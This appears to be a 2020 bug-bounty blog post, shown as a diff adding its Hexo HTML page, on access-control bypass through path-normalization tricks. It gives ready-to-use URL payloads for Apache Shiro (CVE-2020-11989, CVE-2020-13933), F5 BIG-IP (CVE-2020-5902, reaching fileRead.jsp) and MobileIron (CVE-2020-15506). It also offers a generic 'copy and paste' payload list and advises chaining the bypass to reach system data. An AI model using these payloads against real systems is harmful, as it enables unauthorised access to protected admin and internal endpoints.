@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="the fascination of web security is the single payload can help us hit in the heart of system. orange talk about the acl bypass at BlackHat USA 2018. click here enjoy his Presentation What’s more, at o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="acl-bypass-magic">
+<meta property="og:url" content="https://k3mlol.github.io/acl-bypass-magic/index.html">
+<meta property="og:site_name" content="k3mloldeblog">
+<meta property="og:description" content="the fascination of web security is the single payload can help us hit in the heart of system. orange talk about the acl bypass at BlackHat USA 2018. click here enjoy his Presentation What’s more, at o">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://k3mlol.github.io/images/note/smile.gif">
+<meta property="article:published_time" content="2020-09-14T08:57:35.000Z">
+<meta property="article:modified_time" content="2020-09-14T13:16:47.865Z">
+<meta property="article:author" content="k3mlol">
+<meta property="article:tag" content="java security">
+<meta property="article:tag" content="acl bypass">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://k3mlol.github.io/images/note/smile.gif">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>acl-bypass-magic</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="k3mloldeblog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/toollink">tool</a></li>
+         
+          <li><a href="/bloglink">blog</a></li>
+         
+          <li><a href="/bugbounty">bugbounty</a></li>
+         
+          <li><a href="/RedTeam">redteam</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/csrf-is-dead/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://k3mlol.github.io/acl-bypass-magic/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://k3mlol.github.io/acl-bypass-magic/&text=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://k3mlol.github.io/acl-bypass-magic/&title=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://k3mlol.github.io/acl-bypass-magic/&is_video=false&description=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=acl-bypass-magic&body=Check out this article: https://k3mlol.github.io/acl-bypass-magic/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://k3mlol.github.io/acl-bypass-magic/&title=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://k3mlol.github.io/acl-bypass-magic/&title=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://k3mlol.github.io/acl-bypass-magic/&title=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://k3mlol.github.io/acl-bypass-magic/&title=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://k3mlol.github.io/acl-bypass-magic/&name=acl-bypass-magic&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://k3mlol.github.io/acl-bypass-magic/&t=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache-Shrio-CVE-2020-11989"><span class="toc-number">1.</span> <span class="toc-text">Apache Shrio(CVE-2020-11989)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache-Shrio-CVE-2020-13933"><span class="toc-number">2.</span> <span class="toc-text">Apache Shrio(CVE-2020-13933)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#F5-BIG-IP-CVE-2020-5902"><span class="toc-number">3.</span> <span class="toc-text">F5-BIG-IP(CVE-2020-5902)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MobileIron-Authentication-Bypass-CVE-2020-15506"><span class="toc-number">4.</span> <span class="toc-text">MobileIron Authentication Bypass (CVE-2020-15506)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#reference"><span class="toc-number">5.</span> <span class="toc-text">reference</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        acl-bypass-magic
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">k3mloldeblog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-09-14T08:57:35.000Z" itemprop="datePublished">2020-09-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/acl-bypass/" rel="tag">acl bypass</a>, <a class="tag-link" href="/tags/java-security/" rel="tag">java security</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>the fascination of web security is the single payload can help us hit in the heart of system.</p>
+<p>orange talk about the acl bypass at BlackHat USA 2018. <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">click here enjoy his Presentation</a></p>
+<p>What’s more, at one private bug bounty program, orange also use this vuln attack the internal service. I enjoy the report for more than ten times.<br><img src="/images/note/smile.gif" /></p>
+<p>Yes, this is existed in the real word. But you need to guess the reverse proxy server services or you need to take the time to look the system document to guess(brute force) the restrict services.</p>
+<h4 id="Apache-Shrio-CVE-2020-11989"><a href="#Apache-Shrio-CVE-2020-11989" class="headerlink" title="Apache Shrio(CVE-2020-11989)"></a>Apache Shrio(CVE-2020-11989)</h4><p>Apache Shiro before 1.5.3, when using Apache Shiro with Spring dynamic controllers, a specially crafted request may cause an authentication bypass.<br>payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/;/admin_endpoint</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Apache-Shrio-CVE-2020-13933"><a href="#Apache-Shrio-CVE-2020-13933" class="headerlink" title="Apache Shrio(CVE-2020-13933)"></a>Apache Shrio(CVE-2020-13933)</h4><p>Apache Shiro before 1.6.0, when using Apache Shiro, a specially crafted HTTP request may cause an authentication bypass.</p>
+<p>payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test/%3badmin_endpoint</span><br></pre></td></tr></table></figure>
+
+<h4 id="F5-BIG-IP-CVE-2020-5902"><a href="#F5-BIG-IP-CVE-2020-5902" class="headerlink" title="F5-BIG-IP(CVE-2020-5902)"></a>F5-BIG-IP(CVE-2020-5902)</h4><p>payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp</span><br></pre></td></tr></table></figure>
+
+<h4 id="MobileIron-Authentication-Bypass-CVE-2020-15506"><a href="#MobileIron-Authentication-Bypass-CVE-2020-15506" class="headerlink" title="MobileIron Authentication Bypass (CVE-2020-15506)"></a>MobileIron Authentication Bypass (CVE-2020-15506)</h4><p>payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/mifs/.;/services/LogService</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html" target="_blank" rel="noopener">https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html</a></p>
+<hr>
+<p>here we go, Let’s copy and paste the payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/..;/</span><br><span class="line">/;/</span><br><span class="line">/.;/</span><br><span class="line">/../</span><br></pre></td></tr></table></figure>
+
+<p>bug bounty tips:<br>just a acl bypass vuln seems to be harmless, so I suggest you need to dig in to get the system data or chain other vulns.</p>
+<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul>
+<li><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a></li>
+<li><a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">https://xz.aliyun.com/t/7964</a></li>
+<li><a href="https://shiro.apache.org/security-reports.html" target="_blank" rel="noopener">https://shiro.apache.org/security-reports.html</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/toollink">tool</a></li>
+         
+          <li><a href="/bloglink">blog</a></li>
+         
+          <li><a href="/bugbounty">bugbounty</a></li>
+         
+          <li><a href="/RedTeam">redteam</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache-Shrio-CVE-2020-11989"><span class="toc-number">1.</span> <span class="toc-text">Apache Shrio(CVE-2020-11989)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache-Shrio-CVE-2020-13933"><span class="toc-number">2.</span> <span class="toc-text">Apache Shrio(CVE-2020-13933)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#F5-BIG-IP-CVE-2020-5902"><span class="toc-number">3.</span> <span class="toc-text">F5-BIG-IP(CVE-2020-5902)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MobileIron-Authentication-Bypass-CVE-2020-15506"><span class="toc-number">4.</span> <span class="toc-text">MobileIron Authentication Bypass (CVE-2020-15506)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#reference"><span class="toc-number">5.</span> <span class="toc-text">reference</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://k3mlol.github.io/acl-bypass-magic/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://k3mlol.github.io/acl-bypass-magic/&text=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://k3mlol.github.io/acl-bypass-magic/&title=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://k3mlol.github.io/acl-bypass-magic/&is_video=false&description=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=acl-bypass-magic&body=Check out this article: https://k3mlol.github.io/acl-bypass-magic/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://k3mlol.github.io/acl-bypass-magic/&title=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://k3mlol.github.io/acl-bypass-magic/&title=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://k3mlol.github.io/acl-bypass-magic/&title=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://k3mlol.github.io/acl-bypass-magic/&title=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://k3mlol.github.io/acl-bypass-magic/&name=acl-bypass-magic&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://k3mlol.github.io/acl-bypass-magic/&t=acl-bypass-magic" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 k3mlol
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/toollink">tool</a></li>
+         
+          <li><a href="/bloglink">blog</a></li>
+         
+          <li><a href="/bugbounty">bugbounty</a></li>
+         
+          <li><a href="/RedTeam">redteam</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
